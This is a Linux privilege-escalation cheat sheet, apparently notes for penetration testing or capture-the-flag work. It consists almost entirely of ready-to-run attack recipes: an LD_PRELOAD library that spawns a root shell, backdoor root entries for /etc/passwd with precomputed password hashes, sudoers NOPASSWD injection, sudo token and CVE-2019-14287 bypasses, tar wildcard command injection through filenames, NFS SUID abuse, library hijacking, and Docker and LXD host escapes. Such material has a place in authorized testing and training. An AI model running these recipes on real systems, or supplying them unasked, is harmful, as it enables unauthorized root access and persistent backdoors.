##################################################################################
=== TOOLS ===
- Linpeas -
wget "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh" -O linpeas.sh
curl "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh" -o linpeas.sh

./linpeas.sh -a #all checks - deeper system enumeration, but it takes longer to complete.

./linpeas.sh -s #superfast & stealth - This will bypass some time consuming checks. In stealth mode Nothing will be written to the disk.

./linpeas.sh -P #Password - Pass a password that will be used with sudo -l and bruteforcing other users
##################################################################################
=== LD_PRELOAD and NOPASSWD ===
- If LD_PRELOAD is explicitly defined in the sudoers file -
Defaults        env_keep += LD_PRELOAD

Compiles with: gcc -fPIC -shared -o shell.so shell.c -nostartfiles

#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
void _init() {
	unsetenv("LD_PRELOAD");
	setgid(0);
	setuid(0);
	system("/bin/sh");
}

Execute any binary with the LD_PRELOAD to spawn a shell: sudo LD_PRELOAD=<full_path_to_so_file> <program>
e.g: sudo LD_PRELOAD=/tmp/shell.so
##################################################################################
=== Add User To /etc/passwd ===
username: pog
password: pog
- /bin/bash -
pog:$6$D5xqgBo/o5/kesDR$qxXQed0cTHPkCifMM/BlqB42Hh2TfjXzGe6GkouStrRBqYA4VjKfoSCXObXRmWsW0kP7j3iDLJeoY44sqNLWX/:0:0:pog:/pog:/usr/bin/bash
- /bin/zsh -
pog:$6$D5xqgBo/o5/kesDR$qxXQed0cTHPkCifMM/BlqB42Hh2TfjXzGe6GkouStrRBqYA4VjKfoSCXObXRmWsW0kP7j3iDLJeoY44sqNLWX/:0:0:pog:/pog:/usr/bin/zsh
##################################################################################
=== sudo_inject ===
using: https://github.com/nongiach/sudo_inject

$ sudo whatever
[sudo] password for user:    
# Press <ctrl>+c since you don't have the password. 
# This creates an invalid sudo tokens.
$ sh exploit.sh
.... wait 1 seconds
$ sudo -i # no password required :)
# id
uid=0(root) gid=0(root) groups=0(root)
##################################################################################
=== CVE-2019-14287 ===
- vulnerable sudo version -
# Exploitable when a user have the following permissions (sudo -l)
(ALL, !root) ALL

# If you have a full TTY, you can exploit it like this
sudo -u#-1 /bin/bash
sudo -u#4294967295 id
##################################################################################
=== Wildcard (tar) ===
- tar -
# create file for exploitation
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"
echo "#\!/bin/bash\ncat /etc/passwd > /tmp/flag\nchmod 777 /tmp/flag" > shell.sh

# vulnerable script
tar cf archive.tar *
##################################################################################
=== Writable /etc/passwd ===
First generate password:
openssl passwd -1 -salt sus sus 
mkpasswd -m SHA-512 sus 
python2 -c 'import crypt; print crypt.crypt("sus", "$6$salt")'

Then add the user <sus> and add the generated password:
sus:<GENERATED_PASSWORD_HERE>:0:0:sus:/root:/bin/bash

E.g:
sus:$1$sus$TzyKlv0/R/c28R.GAeLw.1:0:0:Sus:/root:/bin/bash
##################################################################################
=== Writable /etc/sudoers ===
echo "<username> ALL=(ALL:ALL) ALL">>/etc/sudoers

# use SUDO without password
echo "<username> ALL=(ALL) NOPASSWD: ALL" >>/etc/sudoers
echo "<username> ALL=NOPASSWD: /bin/bash" >>/etc/sudoers
##################################################################################
=== NFS Root Squashing ===
When no_root_squash appears in /etc/exports, the folder is shareable and a remote user can mount it:
# remote check the name of the folder
showmount -e 10.10.10.10

# create dir
mkdir /tmp/nfsdir  

# mount directory 
mount -t nfs 10.10.10.10:/shared /tmp/nfsdir    
cd /tmp/nfsdir

# copy wanted shell 
cp /bin/bash . 	

# set suid permission
chmod +s bash 	
##################################################################################
=== Shared library ===
- Idconfig -
Identify shared libraries with ldd:
$ ldd /opt/binary

    linux-vdso.so.1 (0x00007ffe961cd000)
    vulnlib.so.8 => /usr/lib/vulnlib.so.8 (0x00007fa55e55a000)
    /lib64/ld-linux-x86-64.so.2 => /usr/lib64/ld-linux-x86-64.so.2 (0x00007fa55e6c8000)        

Create a library in /tmp and activate the path:
gcc –Wall –fPIC –shared –o vulnlib.so /tmp/vulnlib.c
echo "/tmp/" > /etc/ld.so.conf.d/exploit.conf && ldconfig -l /tmp/vulnlib.so
/opt/binary
##################################################################################
=== Docker ===
Mount the filesystem in a bash container, allowing you to edit the /etc/passwd as root,
then add a backdoor account toor:password:

$> docker run -it --rm -v $PWD:/mnt bash
$> echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /mnt/etc/passwd

Almost similar but you will also see all processes running on the host and be connected to the same NICs:
docker run --rm -it --pid=host --net=host --privileged -v /:/host ubuntu bash

- Mounted docker Socket escape -
#Search the socket
find / -name docker.sock 2>/dev/null
#It's usually in /run/docker.sock
#
#List images to use one
docker images
#Run the image mounting the host disk and chroot on it
docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash

# Get full access to the host via ns pid and nsenter cli
docker run -it --rm --pid=host --privileged ubuntu bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash

# Get full privs in container without --privileged
docker run -it -v /:/host/ --cap-add=ALL --security-opt apparmor=unconfined --security-opt seccomp=unconfined --security-opt label:disable --pid=host --userns=host --uts=host --cgroupns=host ubuntu chroot /host/ bash
##################################################################################
=== LXC/LXD ===
The privesc requires to run a container with elevated privileges and 
mount the host filesystem inside:
id

Build an Alpine image and start it using the flag security.privileged=true,
forcing the container to interact as root with the host filesystem:
# build a simple alpine image
git clone https://github.com/saghul/lxd-alpine-builder
./build-alpine -a i686

# import the image
lxc image import ./alpine.tar.gz --alias myimage

# run the image
lxc init myimage mycontainer -c security.privileged=true

# mount the /root into the image
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true

# interact with the container
lxc start mycontainer
lxc exec mycontainer /bin/sh
##################################################################################
